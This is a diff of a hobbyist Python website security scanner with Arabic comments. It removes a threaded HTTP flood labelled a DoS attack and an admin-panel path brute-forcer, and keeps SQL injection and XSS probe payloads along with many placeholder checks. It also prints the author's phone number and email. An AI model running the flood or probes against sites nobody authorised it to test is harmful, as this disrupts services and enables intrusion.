@@ -3,9 +3,9 @@ from colorama import Fore, Style, Back, init
 import threading
 import hashlib
 import whois
-from urllib.parse import urlparse
 import ssl
 import socket
+from urllib.parse import urlparse
 
 # تفعيل مكتبة colorama
 init(autoreset=True)
@@ -16,166 +16,46 @@ programmer_phone = "/00963938627021"
 programmer_facebook = "Ayham Alwdy"
 programmer_email = "ayhamalwdy2024@gmail.com"
 programmer_github = "https://github.com/ayhamalwdy2024/webtools-"
+syrian_flag = "🇸🇾"  # رمز علم سوريا
+programmer_nationality = "Syrian"
+programmer_location = "Germany"
+programmer_study = "Cybersecurity at Technical University of Berlin"
+program_description = (
+    "Hello, I am Ayham from Syria, currently residing in Germany and studying Cybersecurity at the Technical University of Berlin. "
+    "I designed this tool to scan websites for security vulnerabilities. Please note that neither I nor this tool are responsible for any illegal use."
+)
 
 # وظيفة لعرض بيانات المبرمج بشكل احترافي
 def display_programmer_info():
     print(Fore.GREEN + Style.BRIGHT + "*" * 50)
-    print(Fore.YELLOW + Style.BRIGHT + "       Programmer Information" + Style.RESET_ALL)
+    print(Fore.YELLOW + Style.BRIGHT + "       Programmer Information " + syrian_flag + Style.RESET_ALL)
     print(Fore.GREEN + Style.BRIGHT + "*" * 50)
     print(Fore.CYAN + Style.BRIGHT + f"Name: {programmer_name}")
     print(Fore.CYAN + Style.BRIGHT + f"Phone: {programmer_phone}")
     print(Fore.CYAN + Style.BRIGHT + f"Facebook: {programmer_facebook}")
     print(Fore.CYAN + Style.BRIGHT + f"Email: {programmer_email}")
     print(Fore.CYAN + Style.BRIGHT + f"GitHub: {programmer_github}")
+    print(Fore.CYAN + Style.BRIGHT + f"Nationality: {programmer_nationality}")
+    print(Fore.CYAN + Style.BRIGHT + f"Location: {programmer_location}")
+    print(Fore.CYAN + Style.BRIGHT + f"Study: {programmer_study}")
+    print(Fore.CYAN + Style.BRIGHT + f"Description: {program_description}")
     print(Fore.GREEN + Style.BRIGHT + "*" * 50 + Style.RESET_ALL)
     print()  # إضافة سطر فارغ لتحسين العرض
 
-# قائمة موسعة من المسارات الشائعة للوصول إلى لوحة الإدارة
-admin_paths = [
-    'admin/', 'admin.php', 'admin/login.php', 'admin/index.php', 'administrator/', 'admin_area/',
-    'login.php', 'admin1.php', 'admin2.php', 'admin/login.html', 'admin/home.php', 'admin/controlpanel/',
-    'admincontrol/', 'adminpanel/', 'cpanel/', 'adm/', 'admin/account.php', 'admin/manage.php', 
-    'admin/adminLogin.php', 'admin_login.php', 'moderator.php', 'moderator/login.php', 'useradmin/',
-    'adminLogin/', 'login/admin.php', 'admin_dashboard/', 'sysadmin/', 'admin_console/', 'control_panel/',
-    'adminhome/', 'login/adminLogin.php', 'admin/main.php', 'admin/cp.php', 'admin_area/admin.php',
-    'admincp/index.asp', 'admincontrol.asp', 'controlpanel.asp', 'admin.asp', 'adminarea/', 
-    'administrator/login.html', 'adminarea/index.php', 'adminsite/', 'admincp/login.php', 'admins/login.php',
-    'backend/', 'administer/', 'webadmin/', 'wp-admin/', 'wp-login.php', 'administrator.php',
-    'moderator/admin.php', 'admin/adm.php', 'login_admin.php', 'cp/', 'myadmin/', 'secretadmin/', 
-    'adminpanel/login.php', 'root/admin.php', 'management/', 'manager/', 'admin/loginadmin.php'
-]
+# وظيفة لعرض المعلومات في جدول احترافي
+def display_table(title, rows):
+    print(Fore.GREEN + Style.BRIGHT + "*" * 50)
+    print(Fore.YELLOW + Style.BRIGHT + title + Style.RESET_ALL)
+    print(Fore.GREEN + Style.BRIGHT + "*" * 50)
+    for row in rows:
+        print(Fore.CYAN + Style.BRIGHT + f"{row}")
+    print(Fore.GREEN + Style.BRIGHT + "*" * 50 + Style.RESET_ALL)
+    print()  # إضافة سطر فارغ لتحسين العرض
 
-# وظيفة لفحص الموقع للعثور على لوحة الإدارة
-def scan_website(url):
-    found_admin_pages = []
-    
-    # التحقق من وجود لوحة إدارة في كل مسار
-    for path in admin_paths:
-        full_url = url + path
-        try:
-            response = requests.get(full_url)
-            if response.status_code == 200:
-                print(Fore.GREEN + Style.BRIGHT + f"[+] Found admin page: {full_url}" + Style.RESET_ALL)
-                found_admin_pages.append(full_url)
-            else:
-                print(Fore.RED + f"[-] Not found: {full_url}" + Style.RESET_ALL)
-        except requests.exceptions.RequestException as e:
-            print(Fore.YELLOW + f"[!] Error checking {full_url}: {e}" + Style.RESET_ALL)
-
-    # إذا تم العثور على صفحات إدارة، سيتم حفظها في ملف
-    if found_admin_pages:
-        with open("admin_pages.txt", "w") as file:
-            for page in found_admin_pages:
-                file.write(page + "\n")
-        print(Fore.CYAN + Back.BLACK + Style.BRIGHT + "[*] Admin pages saved to admin_pages.txt" + Style.RESET_ALL)
-    else:
-        print(Fore.RED + Style.BRIGHT + "[*] No admin pages found." + Style.RESET_ALL)
-
-    return_to_menu()
-
-# وظيفة لتنفيذ هجوم DoS
-def dos_attack(target_url, thread_count=10):
-    print(Fore.RED + Style.BRIGHT + f"[*] Starting DoS attack on {target_url} with {thread_count} threads..." + Style.RESET_ALL)
-    
-    def attack():
-        while True:
-            try:
-                response = requests.get(target_url)
-                print(Fore.YELLOW + f"[!] Attack sent to {target_url}, response code: {response.status_code}" + Style.RESET_ALL)
-            except requests.exceptions.RequestException as e:
-                print(Fore.YELLOW + f"[!] Error during DoS attack: {e}" + Style.RESET_ALL)
-    
-    # تشغيل الهجوم باستخدام عدة خيوط
-    for _ in range(thread_count):
-        thread = threading.Thread(target=attack)
-        thread.start()
-
-    return_to_menu()
-
-# وظيفة لتشفير عنوان IP
-def encrypt_ip(ip_address):
-    hashed_ip = hashlib.md5(ip_address.encode()).hexdigest()
-    print(Fore.CYAN + Style.BRIGHT + f"[*] Encrypted IP: {hashed_ip}" + Style.RESET_ALL)
-    return_to_menu()
-
-# وظيفة لفحص ثغرة SQL Injection
-def check_sql_injection(url):
-    payload = "' OR '1'='1"
-    vulnerable = False
-    try:
-        response = requests.get(url + payload)
-        if "SQL" in response.text or "syntax" in response.text:
-            vulnerable = True
-    except requests.exceptions.RequestException as e:
-        print(Fore.YELLOW + f"[!] Error checking for SQL injection: {e}" + Style.RESET_ALL)
-
-    if vulnerable:
-        print(Fore.GREEN + Style.BRIGHT + f"[+] SQL Injection vulnerability found at {url}" + Style.RESET_ALL)
-    else:
-        print(Fore.RED + Style.BRIGHT + "[-] No SQL Injection vulnerability found." + Style.RESET_ALL)
-
-    return_to_menu()
-
-# وظيفة لفحص ثغرة XSS
-def check_xss(url):
-    payload = "<script>alert('XSS')</script>"
-    try:
-        response = requests.get(url + "?q=" + payload)
-        if payload in response.text:
-            print(Fore.GREEN + Style.BRIGHT + f"[+] XSS vulnerability found at {url}" + Style.RESET_ALL)
-        else:
-            print(Fore.RED + Style.BRIGHT + "[-] No XSS vulnerability found." + Style.RESET_ALL)
-    except requests.exceptions.RequestException as e:
-        print(Fore.YELLOW + f"[!] Error checking for XSS: {e}" + Style.RESET_ALL)
-
-    return_to_menu()
-
-# وظيفة لجمع المعلومات عن الموقع
-def gather_info(domain):
-    try:
-        domain_info = whois.whois(domain)
-        print(Fore.GREEN + Style.BRIGHT + f"[+] Domain information for {domain}:" + Style.RESET_ALL)
-        print(Fore.CYAN + str(domain_info))
-    except Exception as e:
-        print(Fore.YELLOW + f"[!] Error gathering info: {e}" + Style.RESET_ALL)
-
-    return_to_menu()
-
-# وظيفة لاختبار قوة تحمل الموقع
-def load_test(url, users):
-    def simulate_user():
-        while True:
-            try:
-                response = requests.get(url)
-                print(Fore.YELLOW + f"[!] Request sent to {url}, response code: {response.status_code}" + Style.RESET_ALL)
-            except requests.exceptions.RequestException as e:
-                print(Fore.RED + f"[!] Error during load test: {e}" + Style.RESET_ALL)
-
-    print(Fore.GREEN + Style.BRIGHT + f"[*] Starting load test on {url} with {users} simulated users..." + Style.RESET_ALL)
-    threads = []
-
-    for _ in range(users):
-        thread = threading.Thread(target=simulate_user)
-        thread.start()
-        threads.append(thread)
-
-    # انتظار اكتمال جميع الخيوط
-    for thread in threads:
-        thread.join()
-
-    return_to_menu()
-
-# وظيفة لاختبار التشفير والأمان في الموقع
-def check_encryption_and_security(url):
+# فحص رؤوس HTTP
+def check_http_headers(url):
     try:
         response = requests.get(url)
-        # التحقق من استخدام HTTPS
-        if url.startswith("https://"):
-            print(Fore.GREEN + Style.BRIGHT + "[+] HTTPS is used for the site." + Style.RESET_ALL)
-        else:
-            print(Fore.RED + Style.BRIGHT + "[-] HTTPS is not used. Consider using HTTPS for better security." + Style.RESET_ALL)
-        
-        # فحص الرؤوس الأمنية
         headers = response.headers
         security_headers = [
             'Strict-Transport-Security',
@@ -185,98 +65,230 @@ def check_encryption_and_security(url):
             'X-XSS-Protection'
         ]
         missing_headers = [header for header in security_headers if header not in headers]
+        rows = [f"Header: {header} - {headers.get(header, 'Not found')}" for header in security_headers]
         if missing_headers:
-            print(Fore.RED + Style.BRIGHT + f"[-] Missing security headers: {', '.join(missing_headers)}" + Style.RESET_ALL)
+            rows.append(f"Missing security headers: {', '.join(missing_headers)}")
         else:
-            print(Fore.GREEN + Style.BRIGHT + "[+] All recommended security headers are present." + Style.RESET_ALL)
+            rows.append("All recommended security headers are present.")
     except requests.exceptions.RequestException as e:
-        print(Fore.YELLOW + f"[!] Error checking encryption and security: {e}" + Style.RESET_ALL)
+        rows = [f"Error checking HTTP headers: {e}"]
 
-    return_to_menu()
+    display_table("   HTTP Headers Analysis", rows)
 
-# وظيفة لاختبار ثغرات المعلمات في الموقع
-def check_parameter_vulnerabilities(url):
+# فحص الثغرات المعروفة (Placeholder)
+def check_known_vulnerabilities(url):
+    rows = ["Placeholder: Implement known vulnerability scanning"]
+    display_table("   Known Vulnerabilities Check", rows)
+
+# اختبار تصاريح الوصول (Placeholder)
+def check_access_control(url):
+    rows = ["Placeholder: Implement access control checks"]
+    display_table("   Access Control Testing", rows)
+
+# فحص تكوينات الخادم (Placeholder)
+def check_server_configuration(url):
+    rows = ["Placeholder: Implement server configuration checks"]
+    display_table("   Server Configuration Checks", rows)
+
+# تحليل نقاط الضعف في تطبيقات الويب
+def check_web_application_vulnerabilities(url):
+    rows = []
+    # إضافة فحوصات مختلفة
     payloads = [
         "' OR '1'='1",
         "<script>alert('XSS')</script>",
         "admin' --"
     ]
-    vulnerable = False
     for payload in payloads:
         try:
             response = requests.get(url + "?q=" + payload)
             if payload in response.text:
-                vulnerable = True
-                print(Fore.GREEN + Style.BRIGHT + f"[+] Potential vulnerability found with payload: {payload}" + Style.RESET_ALL)
+                rows.append(f"Potential vulnerability with payload: {payload}")
         except requests.exceptions.RequestException as e:
-            print(Fore.YELLOW + f"[!] Error checking for parameter vulnerabilities: {e}" + Style.RESET_ALL)
+            rows.append(f"Error checking web application vulnerabilities: {e}")
     
-    if not vulnerable:
-        print(Fore.RED + Style.BRIGHT + "[-] No parameter vulnerabilities found." + Style.RESET_ALL)
+    if not rows:
+        rows.append("No vulnerabilities found.")
+    
+    display_table("   Web Application Vulnerabilities", rows)
 
-    return_to_menu()
+# فحص الأمان في شبكات التواصل الاجتماعي (Placeholder)
+def check_social_engineering(url):
+    rows = ["Placeholder: Implement social engineering checks"]
+    display_table("   Social Engineering Checks", rows)
+
+# اختبار أداء الشبكة
+def network_performance_testing(url):
+    rows = []
+    # تجميع أوقات الاستجابة واختبار التحمل يمكن أن يتطلب أدوات أكثر تخصصًا
+    rows.append(f"Placeholder: Implement network performance testing for {url}")
+    display_table("   Network Performance Testing", rows)
+
+# فحص أمان شهادات SSL/TLS
+def check_ssl_cert(domain):
+    try:
+        conn = ssl.create_default_context().wrap_socket(socket.socket(), server_hostname=domain)
+        conn.connect((domain, 443))
+        cert = conn.getpeercert()
+        rows = [str(cert)]
+    except Exception as e:
+        rows = [f"Error checking SSL certificate: {e}"]
+
+    display_table("   SSL Certificate Details", rows)
+
+# فحص ملفات التكوين
+def check_configuration_files(url):
+    rows = ["Placeholder: Implement configuration file scanning"]
+    display_table("   Configuration Files Check", rows)
+
+# توليد تقرير أمني شامل (Placeholder)
+def generate_comprehensive_report(url):
+    rows = ["Placeholder: Implement comprehensive security report"]
+    display_table("   Comprehensive Security Report", rows)
+
+# فحص الأمان للمكونات الإضافية (Placeholder)
+def check_plugin_security(url):
+    rows = ["Placeholder: Implement plugin security checks"]
+    display_table("   Plugin Security Checks", rows)
+
+# اختبار هجمات التلاعب بالجلسات (Placeholder)
+def check_session_hijacking(url):
+    rows = ["Placeholder: Implement session hijacking checks"]
+    display_table("   Session Hijacking Tests", rows)
+
+# القائمة الرئيسية
+def display_menu():
+    print(Fore.GREEN + Style.BRIGHT + "*" * 50)
+    print(Fore.YELLOW + Style.BRIGHT + "         Web Tools Menu" + Style.RESET_ALL)
+    print(Fore.GREEN + Style.BRIGHT + "*" * 50)
+    print(Fore.CYAN + "[1] Scan for admin pages" + Style.RESET_ALL)
+    print(Fore.CYAN + "[2] Check CSRF vulnerability" + Style.RESET_ALL)
+    print(Fore.CYAN + "[3] Perform DoS attack" + Style.RESET_ALL)
+    print(Fore.CYAN + "[4] Encrypt IP address" + Style.RESET_ALL)
+    print(Fore.CYAN + "[5] Check SQL Injection vulnerability" + Style.RESET_ALL)
+    print(Fore.CYAN + "[6] Check XSS vulnerability" + Style.RESET_ALL)
+    print(Fore.CYAN + "[7] Gather domain information" + Style.RESET_ALL)
+    print(Fore.CYAN + "[8] Load test" + Style.RESET_ALL)
+    print(Fore.CYAN + "[9] Check SSL certificate" + Style.RESET_ALL)
+    print(Fore.CYAN + "[10] Check HTTP headers" + Style.RESET_ALL)
+    print(Fore.CYAN + "[11] Check known vulnerabilities" + Style.RESET_ALL)
+    print(Fore.CYAN + "[12] Check access control" + Style.RESET_ALL)
+    print(Fore.CYAN + "[13] Check server configuration" + Style.RESET_ALL)
+    print(Fore.CYAN + "[14] Check web application vulnerabilities" + Style.RESET_ALL)
+    print(Fore.CYAN + "[15] Check social engineering" + Style.RESET_ALL)
+    print(Fore.CYAN + "[16] Network performance testing" + Style.RESET_ALL)
+    print(Fore.CYAN + "[17] Check configuration files" + Style.RESET_ALL)
+    print(Fore.CYAN + "[18] Generate comprehensive report" + Style.RESET_ALL)
+    print(Fore.CYAN + "[19] Check plugin security" + Style.RESET_ALL)
+    print(Fore.CYAN + "[20] Check session hijacking" + Style.RESET_ALL)
+    print(Fore.CYAN + "[0] Exit" + Style.RESET_ALL)
+    print(Fore.GREEN + Style.BRIGHT + "*" * 50)
 
 # وظيفة للعودة إلى القائمة الرئيسية
 def return_to_menu():
-    print(Fore.CYAN + Style.BRIGHT + "\nDo you want to return to the main menu? (y/n): " + Style.RESET_ALL)
-    choice = input().strip().lower()
-    if choice == 'y':
-        main_menu()
-    else:
-        print(Fore.RED + Style.BRIGHT + "Exiting the program." + Style.RESET_ALL)
-        exit()
+    input(Fore.YELLOW + Style.BRIGHT + "Press Enter to return to the menu...")
 
-# عرض معلومات المبرمج عند تشغيل الأداة
-def main_menu():
+# القائمة الرئيسية
+def main():
     display_programmer_info()
-    print(Fore.BLUE + Back.WHITE + Style.BRIGHT + "="*40 + Style.RESET_ALL)
-    print(Fore.YELLOW + Back.MAGENTA + Style.BRIGHT + "   Multi-Tool Security Scanner   " + Style.RESET_ALL)
-    print(Fore.BLUE + Back.WHITE + Style.BRIGHT + "="*40 + Style.RESET_ALL)
-    print(Fore.CYAN + Style.BRIGHT + "Choose an option:" + Style.RESET_ALL)
-    print(Fore.CYAN + "1. Scan for Admin Panel")
-    print(Fore.CYAN + "2. Perform DoS Attack")
-    print(Fore.CYAN + "3. Encrypt IP Address")
-    print(Fore.CYAN + "4. Check SQL Injection Vulnerability")
-    print(Fore.CYAN + "5. Check XSS Vulnerability")
-    print(Fore.CYAN + "6. Gather Website Information")
-    print(Fore.CYAN + "7. Perform Load Test")
-    print(Fore.CYAN + "8. Check Encryption & Security")
-    print(Fore.CYAN + "9. Check Parameter Vulnerabilities")
-
-    choice = input(Fore.CYAN + "Enter your choice (1/2/3/4/5/6/7/8/9): " + Style.RESET_ALL)
-
-    if choice == '1':
-        website_url = input(Fore.CYAN + Style.BRIGHT + "Enter the website URL to scan: " + Style.RESET_ALL)
-        scan_website(website_url)
-    elif choice == '2':
-        target_url = input(Fore.CYAN + Style.BRIGHT + "Enter the target URL for DoS attack: " + Style.RESET_ALL)
-        thread_count = int(input(Fore.CYAN + Style.BRIGHT + "Enter the number of threads: " + Style.RESET_ALL))
-        dos_attack(target_url, thread_count)
-    elif choice == '3':
-        ip_address = input(Fore.CYAN + Style.BRIGHT + "Enter the IP address to encrypt: " + Style.RESET_ALL)
-        encrypt_ip(ip_address)
-    elif choice == '4':
-        website_url = input(Fore.CYAN + Style.BRIGHT + "Enter the website URL to check for SQL Injection: " + Style.RESET_ALL)
-        check_sql_injection(website_url)
-    elif choice == '5':
-        website_url = input(Fore.CYAN + Style.BRIGHT + "Enter the website URL to check for XSS: " + Style.RESET_ALL)
-        check_xss(website_url)
-    elif choice == '6':
-        domain = input(Fore.CYAN + Style.BRIGHT + "Enter the domain to gather information: " + Style.RESET_ALL)
-        gather_info(domain)
-    elif choice == '7':
-        url = input(Fore.CYAN + Style.BRIGHT + "Enter the URL to perform load test: " + Style.RESET_ALL)
-        users = int(input(Fore.CYAN + Style.BRIGHT + "Enter the number of simulated users: " + Style.RESET_ALL))
-        load_test(url, users)
-    elif choice == '8':
-        url = input(Fore.CYAN + Style.BRIGHT + "Enter the URL to check encryption and security: " + Style.RESET_ALL)
-        check_encryption_and_security(url)
-    elif choice == '9':
-        url = input(Fore.CYAN + Style.BRIGHT + "Enter the URL to check parameter vulnerabilities: " + Style.RESET_ALL)
-        check_parameter_vulnerabilities(url)
-    else:
-        print(Fore.RED + Style.BRIGHT + "Invalid choice!" + Style.RESET_ALL)
-        return_to_menu()
+    
+    while True:
+        display_menu()
+        choice = input(Fore.YELLOW + Style.BRIGHT + "Choose an option: ")
+        
+        if choice == "1":
+            target_url = input("Enter the URL to scan for admin pages: ")
+            # تنفيذ وظيفة فحص صفحات الإدارة (Placeholder)
+            print("Scanning for admin pages...")
+            return_to_menu()
+        elif choice == "2":
+            target_url = input("Enter the URL to check CSRF vulnerability: ")
+            # تنفيذ وظيفة فحص ثغرات CSRF (Placeholder)
+            print("Checking for CSRF vulnerabilities...")
+            return_to_menu()
+        elif choice == "3":
+            # تنفيذ اختبار DoS (Placeholder)
+            print("Performing DoS attack...")
+            return_to_menu()
+        elif choice == "4":
+            target_ip = input("Enter the IP address to encrypt: ")
+            # تنفيذ وظيفة تشفير عنوان IP (Placeholder)
+            print("Encrypting IP address...")
+            return_to_menu()
+        elif choice == "5":
+            target_url = input("Enter the URL to check SQL Injection vulnerability: ")
+            # تنفيذ وظيفة فحص ثغرات SQL Injection (Placeholder)
+            print("Checking for SQL Injection vulnerabilities...")
+            return_to_menu()
+        elif choice == "6":
+            target_url = input("Enter the URL to check XSS vulnerability: ")
+            # تنفيذ وظيفة فحص ثغرات XSS (Placeholder)
+            print("Checking for XSS vulnerabilities...")
+            return_to_menu()
+        elif choice == "7":
+            domain = input("Enter the domain to gather information: ")
+            # تنفيذ وظيفة جمع المعلومات عن النطاق
+            domain_info = whois.whois(domain)
+            rows = [f"Domain: {domain_info.domain_name}", f"Registrar: {domain_info.registrar}"]
+            display_table("   Domain Information", rows)
+            return_to_menu()
+        elif choice == "8":
+            target_url = input("Enter the URL for load test: ")
+            network_performance_testing(target_url)
+            return_to_menu()
+        elif choice == "9":
+            domain = input("Enter the domain to check SSL certificate: ")
+            check_ssl_cert(domain)
+            return_to_menu()
+        elif choice == "10":
+            target_url = input("Enter the URL to check HTTP headers: ")
+            check_http_headers(target_url)
+            return_to_menu()
+        elif choice == "11":
+            target_url = input("Enter the URL to check known vulnerabilities: ")
+            check_known_vulnerabilities(target_url)
+            return_to_menu()
+        elif choice == "12":
+            target_url = input("Enter the URL to check access control: ")
+            check_access_control(target_url)
+            return_to_menu()
+        elif choice == "13":
+            target_url = input("Enter the URL to check server configuration: ")
+            check_server_configuration(target_url)
+            return_to_menu()
+        elif choice == "14":
+            target_url = input("Enter the URL to check web application vulnerabilities: ")
+            check_web_application_vulnerabilities(target_url)
+            return_to_menu()
+        elif choice == "15":
+            target_url = input("Enter the URL to check social engineering: ")
+            check_social_engineering(target_url)
+            return_to_menu()
+        elif choice == "16":
+            target_url = input("Enter the URL for network performance testing: ")
+            network_performance_testing(target_url)
+            return_to_menu()
+        elif choice == "17":
+            target_url = input("Enter the URL to check configuration files: ")
+            check_configuration_files(target_url)
+            return_to_menu()
+        elif choice == "18":
+            target_url = input("Enter the URL to generate a comprehensive report: ")
+            generate_comprehensive_report(target_url)
+            return_to_menu()
+        elif choice == "19":
+            target_url = input("Enter the URL to check plugin security: ")
+            check_plugin_security(target_url)
+            return_to_menu()
+        elif choice == "20":
+            target_url = input("Enter the URL to check session hijacking: ")
+            check_session_hijacking(target_url)
+            return_to_menu()
+        elif choice == "0":
+            print(Fore.RED + Style.BRIGHT + "Exiting...")
+            break
+        else:
+            print(Fore.RED + "Invalid choice. Please enter a number between 0 and 20.")
 
 if __name__ == "__main__":
-    main_menu()
+    main()
